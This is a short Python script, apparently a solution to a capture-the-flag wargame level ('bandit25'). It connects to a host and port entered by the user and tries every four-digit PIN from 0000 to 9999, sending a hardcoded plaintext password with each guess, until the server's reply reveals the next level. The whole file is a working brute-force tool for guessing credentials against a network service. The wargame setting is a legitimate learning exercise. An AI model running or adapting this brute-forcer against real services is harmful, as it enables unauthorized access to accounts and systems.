#!/usr/bin/python3

import socket


def server_connect(server):
	try:
		sock = socket.socket()
		sock.connect((server))
		server_msg = sock.recv(2046).decode()
		print('SUCCESS')
		print('\n',server_msg)

		brute(sock)
	except socket.error as err:
		print(f'Failed to connect: Error {err}')
		main()

def brute(sock):
	for i in range(0,10000):
		i = str(i).zfill(4)
		password = 'gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8' + ' ' + i + '\n'
		sock.sendall(password.encode())
		response = sock.recv(1024).decode()
		if 'bandit25' in response:
			print(f'Found the pin: {i}\nResponse: {response}')
		else:
			continue

def main():
	target = input('Enter target: ')
	port = int(input('Enter port: '))
	server = (target,port)
	print(f'Attempting to connect to server...\n')
	server_connect(server)
main()
